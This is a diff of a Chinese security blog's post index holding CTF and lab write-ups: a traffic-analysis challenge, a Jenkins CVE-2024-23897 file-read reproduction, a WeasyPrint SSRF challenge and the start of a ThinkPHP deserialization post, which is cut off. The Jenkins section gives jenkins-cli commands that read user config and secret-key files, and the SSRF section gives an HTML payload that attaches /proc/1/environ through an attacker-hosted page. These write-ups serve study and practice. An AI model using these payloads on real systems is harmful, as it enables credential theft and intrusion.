-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex_string=&#x27;1ae6012ec72fe4b1f14d6963726f736f66742057696e646f7773205b5665&#x27;</span><br><span class="line">hex_string=hex_string.replace(&#x27;.&#x27;,&#x27;&#x27;)</span><br><span class="line">#将字符按照每两个字符分组，转换成十六进制数</span><br><span class="line">hex_parts=[hex_string[i:i+2] for i in range(0,len(hex_string),2)]</span><br><span class="line"></span><br><span class="line">#转换成ascii字符</span><br><span class="line">ascii_result=&#x27;&#x27;.join(chr(int(hex,16)) for hex in hex_parts)</span><br><span class="line">print(ascii_result)</span><br></pre></td></tr></table></figure>
-
-<p>运行结果如下</p>
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210239942.png" alt="image-20240503210239942"></p>
-<p>注意到DNS隧道工具dnscat2，不过有乱码</p>
-<p>直接搜索引擎确定文件名</p>
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210351782.png" alt="image-20240503210351782"></p>
-<p>然后在线网站MD5加密一下，上面那个就是flag</p>
-<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210412841.png" alt="image-20240503210412841"></p>
-]]></content>
-      <categories>
-        <category>流量分析</category>
-      </categories>
   </entry>
   <entry>
     <title>Meerkat-HackTheBox</title>
@@ -1183,75 +1385,6 @@
       <tags>
         <tag>HackTheBox</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Jenkins文件读取漏洞(CVE-2024-23897)</title>
-    <url>/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html</url>
-    <content><![CDATA[<p>最近实在不知道做什么，跟着p神复现下比较火的漏洞</p>
-<span id="more"></span>
-
-<h1 id="Jenkins文件读取漏洞-CVE-2024-23897"><a href="#Jenkins文件读取漏洞-CVE-2024-23897" class="headerlink" title="Jenkins文件读取漏洞(CVE-2024-23897)"></a>Jenkins文件读取漏洞(CVE-2024-23897)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用的是vulhub靶场的环境 <a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897">下载地址</a></p>
-<p>cd进入目录下，依次执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>
-
-<p>访问8080端口即可</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Jenkins提供了一个命令行的接口，用户可以下载一个命令行客户端<code>jenkins-cli.jar</code>到本地，并调用该客户端来执行一些Jenkins的功能。但是用户使用<code>jenkins-cli.jar</code>时，命令行是传到服务端解析的，而不是在jenkins-cli.jar里解析。这就导致一个问题，就是Jenkins服务端解析命令行时使用了一个第三方库<a href="https://github.com/kohsuke/args4j">args4j</a>，这个库实现了Linux中一个常见的功能——如果一个参数是以<code>@</code>开头，则会被自动认为是一个文件名，文件内容会被读取作为参数。所以就造成Jenkins文件读取漏洞。</p>
-<blockquote>
-<p>类似的还有PHP5.5以前，设置POST参数时，如果传入的参数值是<code>@</code>开头，则也会被认为是文件名，并读取该文件，造成文件读取漏洞。</p>
-</blockquote>
-<h2 id="Jenkins权限系统"><a href="#Jenkins权限系统" class="headerlink" title="Jenkins权限系统"></a>Jenkins权限系统</h2><p>正常情况下，cli这个功能的权限控制方案和Jenkins默认权限方案相同</p>
-<p>Jenkins有几种鉴权方案：</p>
-<ul>
-<li><strong>Anyone can do anything</strong> 没有任何权限认证，匿名用户即可登录后台执行Groovy脚本</li>
-<li><strong>Legacy Mode</strong> 旧鉴权模式</li>
-<li><strong>Logged-in users can do anything</strong> 任意登录的用户可以做任何事，这是默认的权限选项</li>
-<li><strong>Matrix-based security</strong> 细颗粒度权限控制，需要安装插件才支持这个鉴权模式</li>
-</ul>
-<p>默认安装后是第3种方案，非常简单，没有垂直权限的区分，登录后的用户就是管理员，没有登录的用户就是匿名用户。</p>
-<p>这种权限方案中，管理员可以设置“匿名用户可读”选项：</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215237335.png"></p>
-<p>这个选项在后台的<code>“Manage Jenkins” -&gt; “Security”</code>中管理员可以将其开启或关闭，默认是关闭的。实际测试中，如果我们访问Jenkins首页，发现强制跳转到登录页面，或者啥功能都没有直接报权限错误，就说明关闭了“匿名用户读”选项。</p>
-<p>我们不妨测试一下关闭了匿名用户可读功能，那么大部分的cli命令也就无法调用，会出现<code>&quot;ERROR: anonymous is missing the Overall/Read permission&quot;</code>的错误：</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215426442.png"></p>
-<p>但有2个命令例外，就是help和who-am-i。这两个命令是无需任何权限的，所以可以用来读取文件</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215733356.png"></p>
-<p>在Vulhub环境中，“匿名用户可读”是开启的，某些Jenkins版本默认安装时可能也是开启的，但通常管理员会关闭这个功能。另外，大部分企业的Jenkins会安装<code>“Matrix-based security”</code>这样的插件来管理权限，也会影响“匿名用户可读”选项的值。总而言之，这个选项的开关取决于管理员是否想让未登录用户看到一些Jenkins的任务。</p>
-<p>总结一下就是：</p>
-<ul>
-<li>当Jenkins开启了“匿名用户可读”功能，大部分命令都可以被调用</li>
-<li>当Jenkins关闭了“匿名用户可读”功能，只有help和who-am-i命令可以被调用</li>
-</ul>
-<h2 id="如何读取想要的内容"><a href="#如何读取想要的内容" class="headerlink" title="如何读取想要的内容"></a>如何读取想要的内容</h2><p>前文已经知道了文件读取漏洞的原理，利用<code>jenkins-cli.jar</code>将命令传到服务端解析借助args4j库特性解析参数有<code>@</code>开头的文件</p>
-<p>要实现任意文件读取，那么就需要返回文件读取后的内容。利用点是如果调用命令行的时候出错，args4j就会把错误返回给客户端而错误信息中就包含文件的内容。</p>
-<p>这里p神提到，如果我们使用<code>@</code>将文件内容加载成命令行参数，那么我们读取文件的时候只能读到文件的前几行</p>
-<p>比如使用help命令能读取前两行</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220700887.png"></p>
-<p>使用keep-build命令，可以读取文件第3行</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220816201.png"></p>
-<p>读取几行内容终究是不够，前文提到如果Jenkins开启了“匿名用户可读”选项，则大部分命令都可以被调用，其中包括<code>connect-node</code>命令和<code>reload-job</code>命令。这俩命令可以用来读取文件全部内容</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408221213026.png"></p>
-<h2 id="Jenkins敏感文件"><a href="#Jenkins敏感文件" class="headerlink" title="Jenkins敏感文件"></a>Jenkins敏感文件</h2><p>如果部署Jenkins是Vulhub的Docker镜像，那么Jenkins的数据根目录是在<code>/var/jenkins_home</code>。但并不是所有人都会使用这个目录作为根目录，如果想读取Jenkins相关的文件，必须先知道Jenkins的根目录在哪里。这时可以读取<code>/proc/self/environ</code>也就是环境变量</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222401625.png"></p>
-<p>拿到了Jenkins的根目录，我们就可以来尝试读取下面这些敏感文件。</p>
-<ul>
-<li><code>/var/jenkins_home/users/*/config.xml</code> 保存所有用户的信息，包括密码、种子、Token等</li>
-<li><code>/var/jenkins_home/secret.key</code> 保存Remember-Me Cookie中的一部分</li>
-<li><code>/var/jenkins_home/secrets/master.key</code> 作为AES解密密钥</li>
-<li><code>/var/jenkins_home/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac</code> 作为计算hmac签名时的Key</li>
-</ul>
-<h3 id="读取用户密码"><a href="#读取用户密码" class="headerlink" title="读取用户密码"></a>读取用户密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/users.xml&quot;</span><br></pre></td></tr></table></figure>
-
-<p>得到用户名<code>admin_6382705393240952219</code></p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222722527.png"></p>
-<p>接着读取到用户密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/admin_6382705393240952219/config.xml&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222813856.png"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>跟着p神复现热门漏洞可以说是非常有收获，c1oudfl0w0师傅说RWCTF2024有道题考的就是这个漏洞，可惜当时没去打hhh</p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-      </categories>
   </entry>
   <entry>
     <title>Monitored-HackTheBox</title>
@@ -1362,7 +1495,7 @@
       </tags>
   </entry>
   <entry>
-    <title>NCTF2023</title>
+    <title>NCTF 2023</title>
     <url>/article/NCTF2023.html</url>
     <content><![CDATA[<p>质量很高的比赛，收获满满</p>
 <span id="more"></span>
@@ -1532,19 +1665,16 @@
 <p><img src="/article/NCTF2023/image-20240401201729069.png"></p>
 ]]></content>
       <categories>
-        <category>CTF</category>
+        <category>CTF比赛</category>
       </categories>
-      <tags>
-        <tag>比赛</tag>
-      </tags>
   </entry>
   <entry>
-    <title>NKCTF2024</title>
+    <title>NKCTF 2024</title>
     <url>/article/NKCTF2024web%E8%A7%A3%E6%9E%90.html</url>
     <content><![CDATA[<p>CVE-2019-9059、沙箱逃逸、CVE-2024-2044</p>
 <span id="more"></span>
 
-<h1 id="NKCTF-2024-web解析"><a href="#NKCTF-2024-web解析" class="headerlink" title="[NKCTF 2024]web解析"></a>[NKCTF 2024]web解析</h1><h2 id="my-first-cms"><a href="#my-first-cms" class="headerlink" title="my first cms"></a>my first cms</h2><p>打开题目在最下面发现是CMS Made Simple，版本为2.2.19</p>
+<h1 id="NKCTF-2024"><a href="#NKCTF-2024" class="headerlink" title="NKCTF 2024"></a>NKCTF 2024</h1><h2 id="my-first-cms"><a href="#my-first-cms" class="headerlink" title="my first cms"></a>my first cms</h2><p>打开题目在最下面发现是CMS Made Simple，版本为2.2.19</p>
 <p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093023723.png"></p>
 <p>扫一下发现存在后台登陆界面，直接访问</p>
 <p>用字典爆破下admin的密码为Admin123</p>
@@ -1609,10 +1739,10 @@
 <p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240326001639956.png"></p>
 ]]></content>
       <categories>
-        <category>CTF</category>
+        <category>CTF比赛</category>
       </categories>
       <tags>
-        <tag>比赛</tag>
+        <tag>CMS</tag>
       </tags>
   </entry>
   <entry>
@@ -1675,11 +1805,58 @@
 <p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124558684.png"></p>
 ]]></content>
       <categories>
-        <category>CTF</category>
+        <category>CTF比赛</category>
       </categories>
-      <tags>
-        <tag>比赛</tag>
-      </tags>
+  </entry>
+  <entry>
+    <title>NSSRound#20 Basic</title>
+    <url>/article/NSSRound-20-Basic.html</url>
+    <content><![CDATA[<p>Jay17师傅出的题</p>
+<span id="more"></span>
+
+
+
+
+
+<h1 id="CSDN-To-PDF-V1-2"><a href="#CSDN-To-PDF-V1-2" class="headerlink" title="CSDN_To_PDF V1.2"></a>CSDN_To_PDF V1.2</h1><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_for</span><br><span class="line">import re</span><br><span class="line">from flask_weasyprint import HTML, render_pdf</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">URL_REGEX = re.compile(</span><br><span class="line">    r&#x27;http(s)?://&#x27;  # http or https</span><br><span class="line">    r&#x27;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def is_valid_url(url):</span><br><span class="line">    if not URL_REGEX.match(url):</span><br><span class="line">        return False</span><br><span class="line">    if &quot;blog.csdn.net&quot; not in url:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def CsdnToPdf():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        url = request.form.get(&#x27;url&#x27;)</span><br><span class="line">        # 当我不知道weasyprint会解析恶意 &lt;link attachment=xxx&gt;？</span><br><span class="line">        url = url.replace(&quot;html&quot;, &quot;&quot;)</span><br><span class="line">        if is_valid_url(url):</span><br><span class="line">            try:</span><br><span class="line">                html = HTML(url=url)</span><br><span class="line">                pdf = html.write_pdf()</span><br><span class="line">                response = make_response(pdf)</span><br><span class="line">                response.headers[&#x27;Content-Type&#x27;] = &#x27;application/pdf&#x27;</span><br><span class="line">                response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=output.pdf&#x27;</span><br><span class="line"></span><br><span class="line">                return response</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return f&#x27;Error generating PDF&#x27;, 500</span><br><span class="line">        else:</span><br><span class="line">            return f&#x27;Invalid URL! Target web address: &#x27; + url</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&quot;index.html&quot;), 200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>
+
+<p>题目是没有给源码的，我们从题目一步步分析</p>
+<p>打开页面，有一个PDF转换器</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401215914318.png"></p>
+<p>存在输入URL大概率有SSRF，随便给个vps的发现不行</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401220042448.png"></p>
+<p>结合转换器是转换CSDN的，那么路径应该要有CSDN</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net</span><br></pre></td></tr></table></figure>
+
+<p>测试成功，我们在vps上开启监听看看</p>
+<p>获得信息<code>WeasyPrint 61.2</code></p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401220234808.png"></p>
+<p><strong>WeasyPrint</strong></p>
+<blockquote>
+<p>WeasyPrint是一个用于HTML和CSS的可视化渲染引擎，可以将HTML文档导出为打印标准的PDF文件</p>
+</blockquote>
+<p>我们可以借助HTML的标签实现文件读取 <a href="https://nahamsec.com/posts/my-expense-report-resulted-in-a-server-side-request-forgery-ssrf-on-lyft">参考文章</a></p>
+<p>查看源码可以注意到我们能够使用 <code>&lt;link rel=attachment href=&quot;file:///root/secret.txt&quot;&gt;</code>将任何网页或本地文件的内容附加到我们的 PDF 中</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401221004300.png"></p>
+<p>前面已经测试过存在SSRF，那么我们在vps上创建link.html文件然后去读取环境变量即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;link rel=&quot;attachment&quot; href=&quot;file:///proc/1/environ&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回到题目，注意到源代码有个链接</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401223407178.png"></p>
+<p>结合css文件我们可以自己构造如下路径，并在vps上创建<code>blog.csdn.net</code>文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.html</span><br></pre></td></tr></table></figure>
+
+<p>结果不行，我们把<code>blog.csdn.net</code>去掉再读发现html没了（应该是被替换成空）</p>
+<p>直接双写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.hthtmlml</span><br></pre></td></tr></table></figure>
+
+<p>得到pdf文件后用binwalk分离一下，得到flag</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401225931026.png"></p>
+]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
   </entry>
   <entry>
     <title>Pov-HackTheBox</title>
@@ -1811,59 +1988,6 @@
         <tag>HackTheBox</tag>
         <tag>提权</tag>
         <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NSSRound#20 Basic</title>
-    <url>/article/NSSRound-20-Basic.html</url>
-    <content><![CDATA[<p>114514</p>
-<span id="more"></span>
-
-
-
-
-
-<h1 id="CSDN-To-PDF-V1-2"><a href="#CSDN-To-PDF-V1-2" class="headerlink" title="CSDN_To_PDF V1.2"></a>CSDN_To_PDF V1.2</h1><p>源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_for</span><br><span class="line">import re</span><br><span class="line">from flask_weasyprint import HTML, render_pdf</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">URL_REGEX = re.compile(</span><br><span class="line">    r&#x27;http(s)?://&#x27;  # http or https</span><br><span class="line">    r&#x27;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def is_valid_url(url):</span><br><span class="line">    if not URL_REGEX.match(url):</span><br><span class="line">        return False</span><br><span class="line">    if &quot;blog.csdn.net&quot; not in url:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def CsdnToPdf():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        url = request.form.get(&#x27;url&#x27;)</span><br><span class="line">        # 当我不知道weasyprint会解析恶意 &lt;link attachment=xxx&gt;？</span><br><span class="line">        url = url.replace(&quot;html&quot;, &quot;&quot;)</span><br><span class="line">        if is_valid_url(url):</span><br><span class="line">            try:</span><br><span class="line">                html = HTML(url=url)</span><br><span class="line">                pdf = html.write_pdf()</span><br><span class="line">                response = make_response(pdf)</span><br><span class="line">                response.headers[&#x27;Content-Type&#x27;] = &#x27;application/pdf&#x27;</span><br><span class="line">                response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=output.pdf&#x27;</span><br><span class="line"></span><br><span class="line">                return response</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return f&#x27;Error generating PDF&#x27;, 500</span><br><span class="line">        else:</span><br><span class="line">            return f&#x27;Invalid URL! Target web address: &#x27; + url</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&quot;index.html&quot;), 200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>
-
-<p>题目是没有给源码的，我们从题目一步步分析</p>
-<p>打开页面，有一个PDF转换器</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401215914318.png"></p>
-<p>存在输入URL大概率有SSRF，随便给个vps的发现不行</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401220042448.png"></p>
-<p>结合转换器是转换CSDN的，那么路径应该要有CSDN</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net</span><br></pre></td></tr></table></figure>
-
-<p>测试成功，我们在vps上开启监听看看</p>
-<p>获得信息<code>WeasyPrint 61.2</code></p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401220234808.png"></p>
-<p><strong>WeasyPrint</strong></p>
-<blockquote>
-<p>WeasyPrint是一个用于HTML和CSS的可视化渲染引擎，可以将HTML文档导出为打印标准的PDF文件</p>
-</blockquote>
-<p>我们可以借助HTML的标签实现文件读取 <a href="https://nahamsec.com/posts/my-expense-report-resulted-in-a-server-side-request-forgery-ssrf-on-lyft">参考文章</a></p>
-<p>查看源码可以注意到我们能够使用 <code>&lt;link rel=attachment href=&quot;file:///root/secret.txt&quot;&gt;</code>将任何网页或本地文件的内容附加到我们的 PDF 中</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401221004300.png"></p>
-<p>前面已经测试过存在SSRF，那么我们在vps上创建link.html文件然后去读取环境变量即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;link rel=&quot;attachment&quot; href=&quot;file:///proc/1/environ&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>回到题目，注意到源代码有个链接</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401223407178.png"></p>
-<p>结合css文件我们可以自己构造如下路径，并在vps上创建<code>blog.csdn.net</code>文件夹</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.html</span><br></pre></td></tr></table></figure>
-
-<p>结果不行，我们把<code>blog.csdn.net</code>去掉再读发现html没了（应该是被替换成空）</p>
-<p>直接双写绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.hthtmlml</span><br></pre></td></tr></table></figure>
-
-<p>得到pdf文件后用binwalk分离一下，得到flag</p>
-<p><img src="/article/NSSRound-20-Basic/image-20240401225931026.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>比赛</tag>
       </tags>
   </entry>
   <entry>
@@ -2174,8 +2298,85 @@
       </categories>
       <tags>
         <tag>HackTheBox</tag>
-        <tag>提权</tag>
         <tag>CMS</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ThinkPHP5.0.24 反序列化漏洞探索</title>
+    <url>/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</url>
+    <content><![CDATA[<p>代码审计代码审计–噩梦的开始</p>
+<span id="more"></span>
+
+
+
+<h1 id="ThinkPHP5-0-24-反序列化漏洞探索"><a href="#ThinkPHP5-0-24-反序列化漏洞探索" class="headerlink" title="ThinkPHP5.0.24 反序列化漏洞探索"></a>ThinkPHP5.0.24 反序列化漏洞探索</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="命名空间-子命名空间"><a href="#命名空间-子命名空间" class="headerlink" title="命名空间&amp;子命名空间"></a>命名空间&amp;子命名空间</h3><p>namespace实际上是命名空间，我们可以把namespace理解为一个单独的空间，事实上它也就是一个空间而已，子命名空间那就是空间里再划分几个小空间，我们通过下面demo来具体了解一下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">animal</span>\<span class="title class_">cat</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;catcatcat&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">animal</span>\<span class="title class_">dogA</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;A:dogdogdog&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">animal</span>\<span class="title class_">dogB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;B:dogdogdog&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运用namespace定义了命名空间animal以及三个子空间<code>cat,dogA,dogB</code>，并且编写三个类。我们来看下面几种运用命名空间的方式</p>
+<ol>
+<li><p>如果我们直接进行实例化<code>new dog();</code>，那么输出结果为<code>B:dogdogdog</code>。这是因为如果不选择命名空间的话，就直接是最后的命名空间<code>namespace animal\dogB</code></p>
+</li>
+<li><p>直接对命名空间对应的类实例化，或者先规定命名空间然后直接实例化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//直接实例化</span><br><span class="line">new \animal\dogA\dog();</span><br><span class="line"></span><br><span class="line">//先规定再实例化</span><br><span class="line">use animal\dogA;</span><br><span class="line">new dogA\dog();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>use</code>在这里和include、require有点像，就是在<strong>当前命名空间引入其他命名空间的别名</strong>，比如<code>use animal\dogA as alias</code>其中的alias就是animal的别名，然后我们就可以用这个别名来调用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use animal\dogA as alias;</span><br><span class="line">new alias\dog();</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>所以当我们在拉反序列化链子的时候 ，除了<code>namespace</code>当前类的命名空间，还要<code>use</code>下一个类的<code>命名空间 + \类名</code></p>
+<hr>
+<h3 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h3><p>直接来看下面demo</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hobby</span>=<span class="string">&quot;game&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am father \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i like play basketball \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">child</span> <span class="keyword">extends</span> <span class="title">father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am child \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span 